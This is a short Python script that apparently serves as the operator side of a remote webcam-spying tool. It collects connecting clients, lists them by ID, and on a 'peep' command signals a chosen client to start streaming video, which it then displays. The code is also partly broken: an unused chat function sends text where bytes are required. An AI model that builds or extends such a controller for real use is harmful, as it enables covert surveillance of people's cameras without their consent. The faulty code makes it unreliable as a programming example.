# -*- coding: utf-8 -*-

import socket, cv2, sys
from vidgear.gears import NetGear
from pickle import dumps, loads
import threading

def chat():
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    port = 12349
    s.bind(('', port))        
    s.listen(5)   
    print ("socket is listening")  
    while True:  
        c, addr = s.accept()      
        print ('Got connection from', addr ) 
        c.send('Thank you for connecting')
        c.close()

def recv_video():
    client = NetGear(port="54548", protocol="tcp", receive_mode=True)
    
    while True:
        
        frame = client.recv()
        if frame is None:
            break
        
        cv2.imshow("Output Frame", frame)
    
        key = cv2.waitKey(1) & 0xFF
        if key == ord("q"):
            break
        
    cv2.destroyAllWindows()
    client.close()
    
def main():
    global clients
    
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    port = 12351
    s.bind(('', port))
    s.listen(5)
    id = 0 
    while True:  
        c, addr = s.accept()
        clients.append([id, c, addr])
        id+=1
        
def send_signal(sock):
    sock.send('VID'.encode())
    

if __name__ == '__main__':
    clients = []
    
    x = threading.Thread(target=main)
    x.start()
    
    while True:
        x = input('Enter you Choice =>')
        if x == 'list':
            for i in clients:
                print(i[0])
        elif x == 'peep':
            temp2 = int(input('Enter you client ID =>'))
            send_signal(clients[temp2][1]) 
            threading.Thread(target=recv_video).start()
        elif x == 'exit':
            break
        else:
            pass
    